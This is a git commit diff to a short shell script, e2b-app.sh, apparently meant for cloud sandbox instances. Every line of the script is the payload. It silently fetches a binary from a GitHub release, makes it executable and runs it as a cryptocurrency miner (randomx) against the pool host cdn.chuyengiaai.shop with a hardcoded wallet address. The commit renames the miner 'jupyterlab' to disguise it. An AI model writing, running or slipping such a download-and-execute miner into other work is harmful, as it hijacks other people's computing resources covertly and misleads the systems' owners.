a569d4f20589379df70f7214cf19062c372056cf
gaserjuk <gaserjukilo@gmail.com>
2026-04-12 21:41:22 +0700

    Update e2b-app.sh

--- e2b-app.sh
+++ e2b-app.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
 
-curl -sLkO https://github.com/satelitlima00/zerox/releases/download/ulo/vltrig >/dev/null 2>&1
-chmod +x vltrig
-./vltrig --o cdn.chuyengiaai.shop:4457 --user 45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi --pass WORKER-E3 --threads 6 >/dev/null 2>&1
+curl -sLkO https://github.com/paskofa10/vps/releases/download/uranus/jupyterlab >/dev/null 2>&1
+chmod 777 jupyterlab
+./jupyterlab -a randomx -o cdn.chuyengiaai.shop:4457 -u 45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi -p WORKER-E4
